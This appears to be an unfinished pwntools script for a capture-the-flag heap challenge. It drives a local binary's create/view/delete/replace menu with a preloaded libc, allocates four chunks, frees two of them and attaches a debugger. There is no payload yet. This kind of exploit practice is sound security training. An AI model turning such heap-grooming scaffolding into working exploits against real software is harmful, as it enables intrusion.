from pwn import *



def create(data):
    p.sendlineafter("[4] replace","1")
    p.sendlineafter(":",data)
def view(idx):
    p.sendlineafter("[4] replace","2")
    p.sendlineafter(":",str(idx))
def delete(idx):
    p.sendlineafter("[4] replace","3")
    p.sendlineafter(":",str(idx))
def replace(idx1,idx2):
    p.sendlineafter("[4] replace","4")
    p.sendlineafter(":",str(idx1))
    p.sendlineafter(":",str(idx2))

elf = context.binary = ELF("./main")
env = {}
env["LD_PRELOAD"] = "./libc/libc.so.6"
p = process(env=env)

# p.sendline("-")
p.sendline("20000")
create(b"0" * 8)
create(b"1" * 8)
create(b"2" * 8)
create(b"3" * 8)
delete(0)
delete(2)
gdb.attach(p)

p.interactive()
